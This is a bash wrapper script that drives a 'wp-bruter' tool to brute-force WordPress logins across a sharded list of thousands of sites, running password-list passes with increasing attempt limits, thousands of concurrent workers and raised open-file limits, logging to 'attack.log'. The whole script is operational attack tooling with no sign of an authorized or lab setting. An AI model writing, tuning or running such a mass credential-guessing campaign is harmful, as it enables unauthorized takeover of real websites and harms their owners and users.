#!/bin/bash
# Breadth-first phase runner for one shard. $1 = shard index.
#
# Pass 1 tries the high-value head of the candidate list on every site, then
# later passes resume from the recorded offset and go deeper. The per-site
# offset is carried in progress.txt by the binary.
set -u
IDX="${1:?shard index}"
cd /opt/wp-bruter || exit 1

# 8000 active sites keep ~2 sockets each; the default soft limit (1024) would
# blow up with "too many open files".
ulimit -n 262144 2>/dev/null || ulimit -n 65535 2>/dev/null

for LIM in ${PHASES:-150 500 0}; do
    # Keep the log from filling the disk across long multi-phase runs.
    [ -f attack.log ] && [ "$(stat -c%s attack.log)" -gt 104857600 ] && mv -f attack.log attack.log.1
    ./wp-bruter \
        -sites "/root/wordpress.s$IDX" \
        -passlist pass.txt \
        -output results.txt \
        -max-workers "${WORKERS_PER_BOX:-4000}" \
        -max-active-sites "${ACTIVE_PER_BOX:-8000}" \
        -prep-workers "${PREP_PER_BOX:-256}" \
        -max-attempts "$LIM" \
        -timeout 5 \
        -verbose >> attack.log 2>&1
    # Wait for this phase's process to disappear before the next one starts,
    # otherwise the PID guard refuses it and the pass is skipped.
    for _ in $(seq 1 40); do pgrep -f "wp-bruter -sites" >/dev/null || break; sleep 1; done
    sleep 2
done
